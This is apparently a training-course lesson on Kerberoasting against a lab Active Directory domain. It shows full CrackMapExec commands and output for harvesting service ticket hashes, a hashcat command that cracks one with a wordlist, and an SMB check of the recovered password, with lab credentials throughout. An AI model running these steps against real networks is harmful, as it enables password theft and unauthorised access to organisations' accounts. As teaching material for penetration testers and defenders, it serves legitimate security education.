# Finding Kerberoastable Accounts

The `Kerberoasting` attack aims to harvest TGS (Ticket Granting Service) Tickets from a user with servicePrincipalName (SPN) values, typically a service account. Any valid Active Directory account can request a TGS for any SPN account. Part of the ticket is encrypted with the account's NTLM password hash, which allows us to attempt to crack the password offline. To learn more about how this attack works, check out the Kerberoasting section of the [Active Directory Enumeration & Attacks](https://academy.hackthebox.com/module/details/143/) module.

To find the Kerberoastable accounts, we need to have a valid user in the domain, use the protocol `LDAP` with the option `--kerberoasting` followed by a file name, and specify the IP address of the DC as a target on CrackMapExec:

### **Kerberoasting Attack**

```shell-session
$ crackmapexec ldap dc01.inlanefreight.htb -u grace -p 'Inlanefreight01!' --kerberoasting kerberoasting.out

SMB         dc01.inlanefreight.htb 445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
LDAP        dc01.inlanefreight.htb 389    DC01             [+] inlanefreight.htb\grace:Inlanefreight01!
LDAP        dc01.inlanefreight.htb 389    DC01             [*] Total of records returned 4
CRITICAL:impacket:CCache file is not found. Skipping...
LDAP        dc01.inlanefreight.htb 389    DC01             sAMAccountName: grace memberOf: CN=SQL Admins,CN=Users,DC=inlanefreight,DC=htb pwdLastSet: 2022-10-25 15:48:04.646233 lastLogon:2022-12-01 07:20:01.171413
LDAP        dc01.inlanefreight.htb 389    DC01             $krb5tgs$23$*grace$INLANEFREIGHT.HTB$inlanefreight.htb/grace*$ce19d59e7823310c7fb51920d24bd56c$[SNIP]
LDAP        dc01.inlanefreight.htb 389    DC01             sAMAccountName: peter memberOf: CN=Remote Management Users,CN=Builtin,DC=inlanefreight,DC=htb pwdLastSet: 2022-10-26 06:55:58.364988 lastLogon:2022-10-26 14:45:08.305940
LDAP        dc01.inlanefreight.htb 389    DC01             $krb5tgs$23$*peter$INLANEFREIGHT.HTB$inlanefreight.htb/peter*$eb2c68e3a5899ec32a9786b8ec58fe7d$[SNIP]
```

If there are any Kerberoastable accounts, CrackMapExec will display them along with the hash we need to attempt to crack offline. In our case, we will use the wordlist rockyou.txt to crack the password and the application [Hashcat](https://hashcat.net/hashcat/). For more on Hashcat usage, see the [Cracking Passwords with Hashcat](https://academy.hackthebox.com/module/details/20) module.

### **Cracking the Hash**

```shell-session
$ hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt

hashcat (v6.1.1) starting...

<SNIP>

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921355
* Keyspace..: 14344386

$krb5tgs$23$*peter$INLANEFREIGHT.HTB$inlanefreight.htb/peter*$026257d4f9aa58cd5c654295eac8255f$[SNIP]
```

Once we get the account's password, we need to verify if the account is still active. We can do this using the SMB protocol, as it will attempt to authenticate as a regular domain user or administrator account.

### **Testing the Account Credentials**

```shell-session
$ crackmapexec smb 10.129.203.121 -u peter -p Password123

SMB         10.129.203.121  445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:inlanefreight.htb) (signing:True) (SMBv1:False)
SMB         10.129.203.121  445    DC01             [+] inlanefreight.htb\peter:Password123
```
